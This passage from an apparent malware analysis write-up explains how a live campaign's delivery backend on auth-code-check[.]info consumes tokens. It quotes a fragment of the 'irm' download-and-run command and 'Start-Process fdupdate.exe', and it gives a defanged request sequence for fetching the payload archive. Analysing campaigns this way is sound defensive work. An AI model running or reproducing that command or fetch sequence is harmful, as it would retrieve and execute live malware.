## Why the first archive went missing

The first replay returned `410 Gone` for the archive path. At first glance that looked like the backend had stopped delivering. The later fresh replay suggests a better explanation: the chain has consumption logic.

In the inner PowerShell, `/p/<archive-token>` is not a prerequisite for archive delivery. It is called after `Start-Process fdupdate.exe`, which makes it a likely success marker. During the first archive attempt, that marker was touched before the archive was fetched. After that, the archive endpoint returned empty `410 Gone` responses. The API check endpoint also later reported consumed/fetched state.

The timestamp sequence supports that conclusion: the `/p/<old-token>` request returned at `20:11:03`, and the archive request returned `410 Gone` at `20:11:04`. That ordering is backwards compared with the decoded PowerShell, which only calls `/p/` after extraction and launch.

There were also request-shape quirks. A PowerShell-like User-Agent caused the initial route to return 404, while default curl fetched the real first-stage wrapper. The copied command also omits the URL scheme in `irm 'auth-code-check.info/<ray>'`, while the first wrapper pivots to an explicit `http://...?...` URL. For replay, the working path was to follow the server shape that returned bytes, preserve the browser-side `action=dl` and `action=cb` sequence, wait, fetch `/7z`, then fetch the archive without touching `/p/`.

With a fresh ray and the intended order:

```text
action=dl -> action=cb -> hxxps://auth-code-check[.]info/<ray> -> hxxp://auth-code-check[.]info/<ray>?_=1 -> wait -> /7z -> archive
```

and without touching `/p/<archive-token>`, the archive delivered successfully.

This means the campaign was still live during the fresh replay, and delivery can be missed if replay does not preserve the backend state machine.

